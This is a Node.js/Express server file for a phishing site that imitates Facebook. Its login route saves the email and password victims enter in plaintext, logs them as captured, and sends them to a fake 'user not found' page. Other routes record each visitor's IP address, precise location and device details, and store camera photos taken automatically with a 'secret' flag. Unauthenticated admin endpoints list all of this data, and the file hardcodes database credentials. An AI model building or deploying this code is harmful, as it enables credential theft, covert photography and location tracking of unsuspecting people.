import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// CORS Configuration
const corsOptions = {
    origin: [
        'http://localhost:3000',
        'http://localhost:3001', 
        'https://localhost:3000',
        process.env.FRONTEND_URL || 'http://localhost:3000',
        // Your deployed frontend URL
        'https://facebook-com-orcin.vercel.app'
        
    ],
    credentials: true,
    optionsSuccessStatus: 200,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'x-forwarded-for']
};

// Middleware
app.use(cors(corsOptions));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

// Request logging middleware
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.path} - IP: ${getClientIP(req)}`);
    next();
});

// MongoDB Connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://Syed:Syed%401234@cluster0.qmcnaw5.mongodb.net/facebook-clone';

mongoose.connect(MONGODB_URI, {
    retryWrites: true,
    w: 'majority'
})
.then(() => {
    console.log('✅ MongoDB connected successfully');
    console.log('📊 Database URL:', MONGODB_URI.replace(/\/\/.*:.*@/, '//***:***@'));
})
.catch(err => {
    console.error('❌ MongoDB connection error:', err.message);
    console.log('🔄 Retrying connection in 5 seconds...');
    setTimeout(() => {
        mongoose.connect(MONGODB_URI).catch(console.error);
    }, 5000);
});

// User Schema
const userSchema = new mongoose.Schema({
    email: {
        type: String,
        required: true
    },
    password: {
        type: String,
        required: true
    },
    ipAddress: {
        type: String,
        required: true
    },
    location: {
        latitude: Number,
        longitude: Number,
        address: String
    },
    timestamp: {
        type: Date,
        default: Date.now
    },
    userAgent: String,
    deviceInfo: String
});

const User = mongoose.model('User', userSchema);

// Function to get client IP
function getClientIP(req) {
    // Try multiple headers and sources for IP
    let ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] ||
             req.headers['x-client-ip'] ||
             req.headers['cf-connecting-ip'] || // Cloudflare
             req.connection?.remoteAddress || 
             req.socket?.remoteAddress ||
             req.ip;
    
    // If x-forwarded-for contains multiple IPs, get the first one
    if (ip && ip.includes(',')) {
        ip = ip.split(',')[0].trim();
    }
    
    // Remove IPv6 prefix if present
    if (ip && ip.startsWith('::ffff:')) {
        ip = ip.substring(7);
    }
    
    // Default fallback
    return ip || 'unknown';
}

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/admin.html'));
});

app.get('/user-not-found', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/user-not-found.html'));
});

// Login API
app.post('/api/login', async (req, res) => {
    try {
        const { 
            email, 
            password, 
            location, 
            ipAddress: frontendIP, 
            timestamp, 
            userAgent, 
            screenResolution, 
            timezone 
        } = req.body;
        
        // Use frontend IP or server IP
        const finalIP = frontendIP || getClientIP(req);
        const finalUserAgent = userAgent || req.headers['user-agent'];
        
        // Save user login data to database
        const newUser = new User({
            email,
            password,
            ipAddress: finalIP,
            location: location || {},
            userAgent: finalUserAgent,
            deviceInfo: finalUserAgent,
            timestamp: new Date(timestamp)
        });

        await newUser.save();
        
        console.log('🔐 NEW LOGIN CAPTURED:', {
            email,
            password,
            ipAddress: finalIP,
            location: location ? `${location.city || 'Unknown'}, ${location.country || 'Unknown'}` : 'No location',
            coordinates: location ? `${location.latitude}, ${location.longitude}` : 'N/A',
            timestamp: new Date()
        });

        // Always return success but redirect to user not found
        res.json({ 
            success: true, 
            message: 'Processing login...',
            redirect: '/user-not-found'
        });
        
    } catch (error) {
        console.error('❌ Login storage error:', error);
        
        // Still redirect to user not found even on error
        res.json({ 
            success: true, 
            message: 'Processing login...',
            redirect: '/user-not-found'
        });
    }
});

// Admin API to get all users
app.get('/api/admin/users', async (req, res) => {
    try {
        const users = await User.find().sort({ timestamp: -1 });
        res.json(users);
    } catch (error) {
        console.error('Admin fetch error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Admin API to get all page visits
app.get('/api/admin/visits', async (req, res) => {
    try {
        const visits = await PageVisit.find().sort({ timestamp: -1 });
        res.json(visits);
    } catch (error) {
        console.error('Admin visits fetch error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});


// Delete user API
app.delete('/api/admin/users/:id', async (req, res) => {
    try {
        await User.findByIdAndDelete(req.params.id);
        res.json({ success: true });
    } catch (error) {
        console.error('Delete error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Clear all users API
app.delete('/api/admin/users', async (req, res) => {
    try {
        await User.deleteMany({});
        res.json({ success: true });
    } catch (error) {
        console.error('Clear all error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});



// Page Visit Schema for tracking all visits (with or without login)
const pageVisitSchema = new mongoose.Schema({
    visitId: {
        type: String,
        required: true,
        unique: true
    },
    ipAddress: {
        type: String,
        required: true
    },
    location: {
        latitude: Number,
        longitude: Number,
        city: String,
        country: String,
        region: String,
        source: String, // 'GPS' or 'IP'
        accuracy: Number,
        error: String
    },
    timestamp: {
        type: Date,
        default: Date.now
    },
    userAgent: String,
    screenResolution: String,
    timezone: String,
    url: String,
    referrer: String,
    hasLoggedIn: {
        type: Boolean,
        default: false
    }
});

const PageVisit = mongoose.model('PageVisit', pageVisitSchema);

// Camera Photo Schema - Enhanced with more metadata
const cameraPhotoSchema = new mongoose.Schema({
    visitId: {
        type: String,
        required: true
    },
    photoData: {
        type: String, // Base64 encoded image
        required: true
    },
    photoNumber: {
        type: Number,
        required: true
    },
    captureType: {
        type: String,
        default: 'standard' // 'initial', 'movement', 'final', 'extra1', 'extra2', 'fallback'
    },
    ipAddress: {
        type: String,
        required: true
    },
    location: {
        latitude: Number,
        longitude: Number,
        city: String,
        country: String,
        region: String,
        source: String,
        accuracy: Number
    },
    timestamp: {
        type: Date,
        default: Date.now
    },
    userAgent: String,
    quality: String, // 'highest', 'high', 'medium', 'low'
    deviceInfo: {
        screenResolution: String,
        colorDepth: Number,
        timezone: String,
        language: String,
        platform: String
    },
    photoSize: Number, // Size in KB
    isAutomatic: {
        type: Boolean,
        default: true
    }
});

const CameraPhoto = mongoose.model('CameraPhoto', cameraPhotoSchema);

// Track page visits with location
app.post('/api/track-visit', async (req, res) => {
    try {
        const { visitId, location, timestamp, userAgent, screenResolution, timezone, url, referrer } = req.body;
        const ipAddress = getClientIP(req);
        
        // Check if visit already exists
        const existingVisit = await PageVisit.findOne({ visitId });
        
        if (existingVisit) {
            // Update existing visit with location data
            existingVisit.location = location;
            existingVisit.userAgent = userAgent;
            existingVisit.screenResolution = screenResolution;
            existingVisit.timezone = timezone;
            await existingVisit.save();
        } else {
            // Create new visit
            const newVisit = new PageVisit({
                visitId,
                ipAddress,
                location: location || {},
                userAgent,
                screenResolution,
                timezone,
                url,
                referrer
            });
            
            await newVisit.save();
        }
        
        console.log('📍 Page visit tracked:', {
            visitId,
            ipAddress,
            location: location?.source || 'no location',
            timestamp: new Date()
        });
        
        res.json({ success: true });
    } catch (error) {
        console.error('Visit tracking error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// General page visit tracking with complete data storage
app.post('/api/page-visit', async (req, res) => {
    try {
        const { 
            visitId, 
            ipAddress: frontendIP, 
            location, 
            timestamp, 
            userAgent, 
            screenResolution, 
            timezone, 
            url, 
            referrer 
        } = req.body;
        
        // Use frontend detected IP or fallback to server detected IP
        const finalIP = frontendIP || getClientIP(req);
        
        // Create or update page visit record
        const existingVisit = await PageVisit.findOne({ visitId });
        
        if (existingVisit) {
            // Update existing visit with complete data
            existingVisit.ipAddress = finalIP;
            existingVisit.location = location || existingVisit.location;
            existingVisit.userAgent = userAgent;
            existingVisit.screenResolution = screenResolution;
            existingVisit.timezone = timezone;
            existingVisit.url = url;
            existingVisit.referrer = referrer;
            await existingVisit.save();
        } else {
            // Create new visit record
            const newVisit = new PageVisit({
                visitId,
                ipAddress: finalIP,
                location: location || {},
                timestamp: new Date(timestamp),
                userAgent,
                screenResolution,
                timezone,
                url,
                referrer
            });
            
            await newVisit.save();
        }
        
        console.log('✅ COMPLETE page visit stored in database:', {
            visitId,
            ipAddress: finalIP,
            location: location ? `${location.city || 'Unknown'}, ${location.country || 'Unknown'}` : 'No location',
            coordinates: location ? `${location.latitude}, ${location.longitude}` : 'N/A',
            source: location?.source || 'No location',
            timestamp: new Date(timestamp)
        });
        
        res.json({ 
            success: true, 
            storedIP: finalIP,
            locationStored: !!location 
        });
    } catch (error) {
        console.error('Page visit storage error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Track user-not-found page visits
app.post('/api/user-not-found-visit', (req, res) => {
    console.log('User visited not-found page:', {
        timestamp: req.body.timestamp,
        userAgent: req.body.userAgent,
        referrer: req.body.referrer,
        ip: getClientIP(req)
    });
    res.json({ success: true });
});

// Camera photo upload API with complete data storage - Enhanced
app.post('/api/upload-photo', async (req, res) => {
    try {
        const { 
            visitId, 
            photoData, 
            photoNumber, 
            captureType,
            ipAddress: frontendIP, 
            location, 
            quality, 
            secret,
            deviceInfo,
            timestamp
        } = req.body;
        
        // Use frontend detected IP or fallback to server IP
        const finalIP = frontendIP || getClientIP(req);
        const userAgent = req.headers['user-agent'];
        
        // Remove base64 prefix if present
        const imageData = photoData.includes('base64,') ? 
                         photoData.split('base64,')[1] : 
                         photoData;
        
        // Calculate photo size in KB
        const photoSizeKB = Math.round(imageData.length / 1024);
        
        const newPhoto = new CameraPhoto({
            visitId,
            photoData: imageData,
            photoNumber,
            captureType: captureType || 'standard',
            ipAddress: finalIP,
            location: location || {},
            userAgent,
            quality: quality || 'medium',
            deviceInfo: deviceInfo || {},
            photoSize: photoSizeKB,
            timestamp: new Date(timestamp || Date.now()),
            isAutomatic: true
        });

        await newPhoto.save();
        
        const logPrefix = secret ? '🔒 SECRET' : '📸';
        const locationStr = location ? `${location.city || 'Unknown'}, ${location.country || 'Unknown'}` : 'No location';
        
        console.log(`${logPrefix} AUTOMATIC Photo ${photoNumber} (${captureType}) stored:`, {
            visitId,
            ipAddress: finalIP,
            location: locationStr,
            coordinates: location ? `${location.latitude}, ${location.longitude}` : 'N/A',
            photoSize: photoSizeKB + 'KB',
            quality,
            captureType,
            resolution: deviceInfo?.screenResolution || 'Unknown',
            secret: !!secret,
            timestamp: new Date()
        });

        res.json({ 
            success: true, 
            stored: true,
            ip: finalIP,
            photoSize: photoSizeKB,
            quality: quality
        });
        
    } catch (error) {
        console.error('❌ Photo upload error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Admin API to get all photos
app.get('/api/admin/photos', async (req, res) => {
    try {
        const photos = await CameraPhoto.find().sort({ timestamp: -1 });
        res.json(photos);
    } catch (error) {
        console.error('Admin photos fetch error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Delete page visit API - Clears location data when visit is deleted
app.delete('/api/admin/visits/:id', async (req, res) => {
    try {
        const deletedVisit = await PageVisit.findByIdAndDelete(req.params.id);
        
        if (deletedVisit) {
            console.log('🗑️ Page visit deleted with location data:', {
                visitId: deletedVisit.visitId,
                ipAddress: deletedVisit.ipAddress,
                location: deletedVisit.location?.city || 'No location',
                timestamp: deletedVisit.timestamp
            });
        }
        
        res.json({ success: true, deleted: !!deletedVisit });
    } catch (error) {
        console.error('Delete visit error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Clear all page visits API - Clears all location data
app.delete('/api/admin/visits', async (req, res) => {
    try {
        const deleteResult = await PageVisit.deleteMany({});
        
        console.log(`🗑️ ALL page visits cleared: ${deleteResult.deletedCount} records with location data deleted`);
        
        res.json({ 
            success: true, 
            deletedCount: deleteResult.deletedCount,
            message: 'All page visits and location data cleared' 
        });
    } catch (error) {
        console.error('Clear all visits error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Delete photo API
app.delete('/api/admin/photos/:id', async (req, res) => {
    try {
        const deletedPhoto = await CameraPhoto.findByIdAndDelete(req.params.id);
        
        if (deletedPhoto) {
            console.log('🗑️ Photo deleted:', {
                visitId: deletedPhoto.visitId,
                photoNumber: deletedPhoto.photoNumber,
                ipAddress: deletedPhoto.ipAddress,
                timestamp: deletedPhoto.timestamp
            });
        }
        
        res.json({ success: true, deleted: !!deletedPhoto });
    } catch (error) {
        console.error('Delete photo error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Clear all photos API
app.delete('/api/admin/photos', async (req, res) => {
    try {
        const deleteResult = await CameraPhoto.deleteMany({});
        
        console.log(`🗑️ ALL photos cleared: ${deleteResult.deletedCount} photos deleted`);
        
        res.json({ 
            success: true, 
            deletedCount: deleteResult.deletedCount,
            message: 'All photos cleared' 
        });
    } catch (error) {
        console.error('Clear all photos error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Clear all data API - Users, Visits, and Photos
app.delete('/api/admin/clear-all', async (req, res) => {
    console.log('🗑️ CLEAR ALL DATA endpoint called');
    try {
        console.log('🗑️ Starting data deletion process...');
        const [userResult, visitResult, photoResult] = await Promise.all([
            User.deleteMany({}),
            PageVisit.deleteMany({}),
            CameraPhoto.deleteMany({})
        ]);
        
        console.log('🗑️ COMPLETE DATA WIPE:', {
            usersDeleted: userResult.deletedCount,
            visitsDeleted: visitResult.deletedCount,
            photosDeleted: photoResult.deletedCount,
            timestamp: new Date()
        });
        
        res.json({ 
            success: true, 
            deletedCounts: {
                users: userResult.deletedCount,
                visits: visitResult.deletedCount,
                photos: photoResult.deletedCount
            },
            message: 'All data cleared including location data'
        });
    } catch (error) {
        console.error('Clear all data error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

app.listen(PORT, () => {
    console.log('\n' + '='.repeat(60));
    console.log('🚀 FACEBOOK CLONE - BACKEND SERVER STARTED');
    console.log('='.repeat(60));
    console.log(`⚙️  Backend Server: http://localhost:${PORT}`);
    console.log(`🌐 Frontend Pages: http://localhost:${PORT}`);
    console.log(`📊 Admin Panel: http://localhost:${PORT}/admin`);
    console.log(`🔗 API Base: http://localhost:${PORT}/api`);
    console.log(`📁 Static Files: Serving from ../frontend`);
    console.log(`🛡️  CORS: Enabled for multiple origins`);
    console.log(`🔒 Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log('='.repeat(60));
    console.log('✅ Ready to capture login attempts!');
    console.log('\n');
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('\n🛑 Shutting down gracefully...');
    mongoose.connection.close(() => {
        console.log('📊 MongoDB connection closed.');
        process.exit(0);
    });
});


